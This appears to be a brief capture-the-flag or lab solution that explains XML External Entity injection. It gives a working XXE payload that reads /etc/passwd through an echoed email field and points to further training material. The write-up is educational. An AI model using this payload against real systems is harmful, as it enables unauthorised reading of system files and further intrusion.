XML External Entity (XXE) occurs when XML external entities are interpreted incorrectly, allowing an attacker to perform SSRF, LFI, DOS, and in extreme cases, run system commands.

Since the form is being sent as an XML and the email address is being echoed back in the page, you can inject an external entity. The entity should echo back in the email address if the system is vulnerable to XXE. In this case, it is, the below XML is the solution

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY iwantthisfilenow SYSTEM "file:///etc/passwd">]>
<root>
<firstname>john</firstname>
<phonenumber>0000</phonenumber>
<emailadd>&iwantthisfilenow;</emailadd>
</root>
```

<h3>Futher reading</h3>

To learn more about how this vulnerability is exploited, I would recommend the burp suite web academy. The first few exercises are like this one, but the later exercises show how XXE can be used to perform attacks like SSRF.

https://portswigger.net/web-security/xxe
